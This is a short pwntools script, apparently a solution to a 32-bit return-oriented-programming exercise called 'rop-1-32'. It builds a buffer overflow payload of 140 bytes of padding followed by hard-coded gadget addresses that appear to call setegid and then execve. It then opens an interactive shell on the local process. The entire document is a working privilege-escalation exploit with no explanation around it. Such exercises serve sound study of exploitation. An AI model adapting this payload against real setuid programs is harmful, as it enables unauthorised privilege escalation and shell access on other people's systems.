
from pwn import *

seteg = p32(0x80483e0)
pp = p32(0x0804865a)
ex = p32(0x80483c0)

bn = p32(0x8048700)
p = process("./rop-1-32")

payload = "A" * 140 + seteg + pp + p32(50000) + p32(50000) + ex + "AAAA" + bn + "\x00"*8

p.sendline(payload)

p.interactive()
